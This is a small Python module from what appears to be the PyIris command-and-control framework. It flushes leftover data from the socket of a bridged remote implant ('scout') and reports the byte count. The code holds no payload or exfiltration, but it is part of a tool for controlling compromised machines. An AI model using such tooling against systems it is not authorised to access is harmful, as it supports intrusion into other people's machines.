# API
# done
import socket
import pyiris_api.library.modules.recv_all as recv_all


def main(self, sock, command):
    self.log.inf('Attempting to flush socket buffer')
    bytes_flushed = 0
    try:
        timeout = int(command.split(" ", 1)[1])
    except IndexError:
        timeout = 5
    except ValueError:
        self.log.err('Invalid timeout value')
        return {"status": "error", "message": "", "data": {"scout_output": '[-]Invalid timeout value'}}
    while True:
        try:
            data = recv_all.main(self.config.scout_database[self.config.bridged_to]["conn_object"], timeout)
            if len(data) == 0:
                break
            bytes_flushed += len(data)
        except (socket.error, socket.timeout):
            break
    self.log.pos('Flushed ' + str(bytes_flushed) + ' bytes from scout socket')
    return {"status": "ok", "message": "", "data": {"scout_output": '[+]Flushed ' + str(bytes_flushed) + ' bytes from scout socket'}}